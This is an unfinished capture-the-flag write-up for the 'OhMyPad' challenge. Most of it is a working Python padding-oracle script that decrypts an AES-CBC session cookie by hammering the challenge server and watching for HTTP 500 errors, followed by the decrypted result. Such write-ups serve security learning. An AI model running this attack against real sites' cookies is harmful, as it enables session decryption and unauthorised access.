# OhMyPad

### [~$ cd ..](../)

For this challenge we were given, a website wich had nothing but a login page.
After inspecting the page code, we noticed two interesting comments :
* There is a test account using `test` as username and password.
* There is a roadmap telling to move away from CBC AES for cookie encryption.

So we logged in using the test account, and tried to attack the cookie using an oracle attack using the following script :

```py
from paddingoracle import BadPaddingException, PaddingOracle
from base64 import b16encode, b16decode
from urllib import quote, unquote
import requests
import socket
import time

class PadBuster(PaddingOracle):
    def __init__(self, **kwargs):
        super(PadBuster, self).__init__(**kwargs)

    def oracle(self, data, **kwargs):
        print("[*] Trying: {}".format(b16encode(data)))

        # Do Crypto that throws something different if padding error
        r = requests.get("http://34.248.41.47/portal", cookies = {"SESSION":b16encode(data)})
        if r.status_code == 500:
            raise BadPaddingException

if __name__ == '__main__':
    import logging
    import sys

    logging.basicConfig(level=logging.DEBUG)
    # This is a random string the server printed for us,
    # assuming have to decrypt this, and see what we get
    #Decrypted: 126EFEB2A31FA50C05418F58F95F6D1091C8076370C1DE6414968164348571F93A83777542E1C9983C75FD330E3AA69248974FDDEAEB343B26DD7FB5B7D806CF => bytearray(b'9c8aa499a41d52109197fe5bfc843857|test|test@nviso.de\r\r\r\r\r\r\r\r\r\r\r\r\r')
    encrypted_value = '126EFEB2A31FA50C05418F58F95F6D1091C8076370C1DE6414968164348571F93A83777542E1C9983C75FD330E3AA69248974FDDEAEB343B26DD7FB5B7D806CF'
    padbuster = PadBuster()

    value = padbuster.decrypt(b16decode(encrypted_value), block_size=16, iv=bytearray(16))

    print('Decrypted: %s => %r' % (encrypted_value, value))
```

After a few minutes of intense server requests we finally decrypted the cookie.

```
bytearray(b'9c8aa499a41d52109197fe5bfc843857|test|test@nviso.de\r\r\r\r\r\r\r\r\r\r\r\r\r')
```

Unfortunately that didn't get us any further.

NOT DONE
